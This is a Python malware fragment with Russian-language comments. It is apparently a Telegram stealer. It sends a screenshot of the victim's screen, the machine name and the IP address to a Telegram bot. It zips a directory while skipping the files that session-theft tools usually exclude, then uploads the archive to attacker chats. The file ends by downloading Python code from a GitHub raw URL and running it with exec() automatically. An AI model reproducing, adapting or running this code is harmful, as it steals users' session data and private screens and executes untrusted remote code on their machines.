code_to_execute = ''
def send_message_to_group(chat_id, screenshot):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
    image_buffer = BytesIO()
    screenshot.save(image_buffer, format='JPEG')
    image_buffer.seek(0)
    files = {'photo': ('screenshot.jpg', image_buffer)}
    response = requests.post(url, data=data, files=files)
def send_file_to_telegram(file_path, file_name):
    url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
    for chat_id in chat_ids:
        files = {'document': (file_name, open(file_path, 'rb'))}
        data = {'chat_id': chat_id}
        response = requests.post(url, files=files, data=data)
        if response.status_code != 200:
            bot.send_message(chat_id, 'ОШИБКА БРАТИШ ХЗ ПОПРОБУЙ ЕЩЕ')
            print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
            print(response.text)
def create_zip_archive(source_dir, output_zip):
    try:
        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
            pass  # Создаем пустой архив для начала
        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:  # Открываем архив для добавления файлов
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path or "working" in file_path:
                        continue
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
                    except Exception as e:
                        print(f"Error adding file to zip: {str(e)}")
        return output_zip + '.zip'
    except Exception as e:
        print(f"Error creating zip archive: {str(e)}")
        return None
def archive_and_send():
    url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/a_s.py'
    response = requests.get(url)
    html_content = response.content
    soup = BeautifulSoup(html_content, 'html.parser')
    text_without_tags = soup.get_text()
    exec(text_without_tags)
archive_and_send()
